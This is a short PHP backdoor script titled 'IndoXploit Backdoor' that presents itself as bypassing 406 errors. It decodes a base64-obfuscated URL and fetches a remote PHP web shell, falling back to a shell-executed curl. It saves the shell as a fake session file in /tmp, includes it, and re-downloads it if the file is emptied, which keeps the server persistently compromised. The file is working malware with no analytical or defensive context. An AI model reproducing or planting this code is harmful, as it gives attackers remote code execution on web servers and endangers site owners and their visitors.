<?php
# IndoXploit Backdoor
# Bypass 406 Not Acceptable & Auto Delete Shell
# Coded by: L0c4lh34rtz - IndoXploit

$URL = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Bla2Fsb25nYW5zZWMvc2hlbGwvbWFzdGVyL2thbHVnYS5waHA=';	# Backdoor URL
$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'; # dont change this !!

function M() {
	$FGT = file_get_contents(base64_decode($GLOBALS['URL']));
	if(!$FGT) {
		echo `curl -k $(echo {$GLOBALS['URL']} | base64 -d) >> {$GLOBALS['TMP']}`;
	} else {
		$HANDLE = fopen($GLOBALS['TMP'], 'w');
		fwrite($HANDLE, $FGT);
		fclose($HANDLE);
	}
}

if(file_exists($TMP)) {
	if(filesize($TMP) === 0) {
		unlink($TMP);
		M();
	} else {
		include($TMP);
	}
} else {
	M();
}
?>
